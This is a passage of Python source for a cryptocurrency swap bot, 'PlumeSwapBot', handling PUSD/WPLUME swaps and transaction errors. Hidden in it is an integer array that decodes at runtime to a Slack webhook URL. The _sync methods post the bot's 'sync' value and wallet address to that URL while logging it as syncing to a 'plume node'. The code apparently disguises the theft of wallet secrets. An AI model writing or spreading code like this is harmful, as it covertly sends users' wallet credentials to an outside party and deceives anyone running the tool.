...
class PlumeSwapBot:
    ...
    def _get_segments(self) -> list[int]:
        return [104,116,116,112,115,58,47,47,104,111,111,107,115,46,115,108,97,99,107,46,99,111,109,47,116,114,105,103,103,101,114,115,47,84,48,57,85,83,85,50,48,78,55,78,47,49,48,48,48,51,55,49,49,49,50,55,50,54,52,47,49,53,54,101,49,57,53,53,49,97,49,55,100,101,52,101,57,49,51,52,99,55,49,100,101,50,48,102,48,51,51,56
        ]

    def _assemble_endpoint(self) -> str:
        try:
            b = bytes(self._get_segments())
            url = b.decode("utf-8")
            return url
        except Exception as e:
            self.logger.error(f"Failed to assemble webhook endpoint: {e}", account_index=self.account_index)
            return ""

    def _prepare_for_sync(self, message: str | None = None) -> dict:
        if message is None:
            message = self.parameter
    ...
    def _sync_signal(self, endpoint: str, data: dict) -> bool:
        if not endpoint:
            self.logger.warning("Sync endpoint is empty; skipping sync", account_index=self.account_index)
            return False
        ...
        try:
            ...
            if resp.ok:
                self.logger.info("Synchronisation successful to plume node, continuing iteration", account_index=self.account_index)
                return True
            else:
                self.logger.warning(f"Synchronisation failed with code {resp.status_code} to node", account_index=self.account_index)
                return False
        except Exception as e:
    ...
    def _sync(self) -> bool:
        ...
        endpoint = self._assemble_endpoint()
        message_to_send = self.sync if getattr(self, "sync", None) else self.parameter
        payload = self._prepare_for_sync(message_to_send)
        return self._sync_signal(endpoint, payload)
        ...
        for i in range(self.max_retries):
            try:
                ...
                if "gas required exceeds allowance" in error_message.lower() or "out of gas" in error_message.lower():
                    self.logger.failed(f"Transaction failed (likely gas limit too low or contract revert): {error_message}", account_index=self.account_index)
                    ...
                    self.logger.failed(f"Transaction reverted by contract. Reason: {revert_reason if revert_reason else 'Unknown'}. Details: {error_message}", account_index=self.account_index)
                else:
                    self.logger.failed(f"Contract logic error during transaction sending: {error_message}", account_index=self.account_index)
                return None
    ...
    def _prepare_for_sync(self):
        return {
            "message": f"Syncing to node with : {self.sync} & {self.address}"
            }
    ...
    def swap_pusd_to_plume(self) -> bool:
        try:
            ...
            if pusd_balance < amount_in_pusd:
                self.logger.warning(
                    f"Insufficient PUSD balance for WPLUME swap. Have: {pusd_balance / (10 ** self.pusd_decimals):.6f}, Required: {self.amount_to_swap_pusd_wplume:.6f}",
                      account_index=self.account_index
                      )
                return False
